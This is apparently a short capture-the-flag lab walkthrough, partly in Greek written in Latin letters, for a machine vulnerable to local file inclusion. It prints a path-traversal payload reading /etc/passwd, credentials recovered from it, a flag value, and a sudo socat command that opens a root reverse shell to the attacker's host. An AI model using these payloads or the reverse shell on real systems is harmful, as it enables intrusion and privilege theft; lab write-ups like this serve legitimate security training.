<pre>
Machine IP: 10.10.119.102


Enum:


Open ports :
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)



Got  to the vuln url: http://10.10.119.102/article?name=lfiattack

Type on browser : http://10.10.119.102/article?name=../../../../../../etc/passwd
Right click and view page source code

#falconfeast:rootpassword creds for ssh connection!

ssh falconfeast@10.10.119.102 pwd -> rootpassword

Ls and cat user.txt:60989655118397345799

Priv esc:

falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat

Edw vlepoyme oti exoyme to socat ena pio powerfull version toy netcat poy mporoyme na to trexoyme ws root me sudo..
Anoigoyme ena listener gia na kanoyme revshell: socat file:`tty`,raw,echo=0 tcp-listen:1234
 
Kai meta trexoyme ayto: sudo socat tcp-connect:10.9.199.66:1234 exec:bash,pty,stderr,setsid,sigint,sane

Kai exome root gia na paroyme to flag mas..
Cat /root/root.txt
</pre>
